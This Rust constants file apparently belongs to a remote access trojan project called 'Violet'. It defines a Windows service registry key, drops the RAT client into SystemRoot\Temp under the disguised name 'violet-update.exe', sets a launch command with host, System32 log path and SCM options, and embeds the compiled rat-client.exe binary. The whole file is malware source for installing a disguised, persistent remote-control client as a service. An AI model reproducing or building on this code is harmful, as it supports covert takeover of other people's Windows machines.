use widestring::{U16CStr, u16cstr};

pub const SERVICE_REGISTRY: &U16CStr =
    u16cstr!("\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\Violet");

pub const RAT_CLIENT_OBJ_PATH: &U16CStr = u16cstr!("\\SystemRoot\\Temp\\violet-update.exe");
pub const RAT_CLIENT_PATH: &U16CStr = u16cstr!(
    "%SystemRoot%\\Temp\\violet-update.exe --host 127.0.0.1 --log-path %SystemRoot%\\System32\\violet.log --scm"
);

#[cfg(debug_assertions)]
pub const RAT_CLIENT: &[u8] = include_bytes!("../../target/debug/rat-client.exe");

#[cfg(not(debug_assertions))]
pub const RAT_CLIENT: &[u8] = include_bytes!("../../target/release/rat-client.exe");
